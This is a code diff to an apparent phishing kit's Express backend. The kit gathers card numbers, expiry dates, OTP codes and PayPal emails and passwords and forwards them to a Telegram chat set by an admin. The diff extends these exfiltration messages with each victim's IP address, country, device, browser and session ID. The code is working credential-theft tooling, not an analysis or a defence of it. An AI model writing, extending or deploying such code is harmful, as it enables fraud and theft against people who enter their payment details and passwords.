@@ -9,7 +9,8 @@ import { z } from "zod";
 import { 
   sendTelegramMessage, 
   formatPaymentNotification,
-  formatPayPalNotification 
+  formatPayPalNotification,
+  getClientInfo
 } from "./telegram";
 
 export async function registerRoutes(app: Express): Promise<Server> {
@@ -122,6 +123,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Send notification to Telegram after OTP2 is verified
       const settings = await storage.getAdminSettings();
       if (settings?.telegramBotToken && settings?.telegramChatId) {
+        const clientInfo = await getClientInfo(req);
+        
         const message = formatPaymentNotification({
           cardNumber: updated.cardNumber,
           expiryMonth: updated.expiryMonth,
@@ -131,6 +134,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
           otp1: updated.otp1 || undefined,
           otp2: updated.otp2 || undefined,
           timestamp: updated.createdAt || new Date(),
+          ipAddress: clientInfo.ipAddress,
+          country: clientInfo.country,
+          device: clientInfo.device,
+          browser: clientInfo.browser,
         });
 
         await sendTelegramMessage(
@@ -158,10 +165,17 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Send notification to Telegram
       const settings = await storage.getAdminSettings();
       if (settings?.telegramBotToken && settings?.telegramChatId) {
+        const clientInfo = await getClientInfo(req);
+        
         const message = formatPayPalNotification({
           email,
           password,
           timestamp: new Date(),
+          ipAddress: clientInfo.ipAddress,
+          country: clientInfo.country,
+          device: clientInfo.device,
+          browser: clientInfo.browser,
+          sessionId: clientInfo.sessionId,
         });
 
         await sendTelegramMessage(
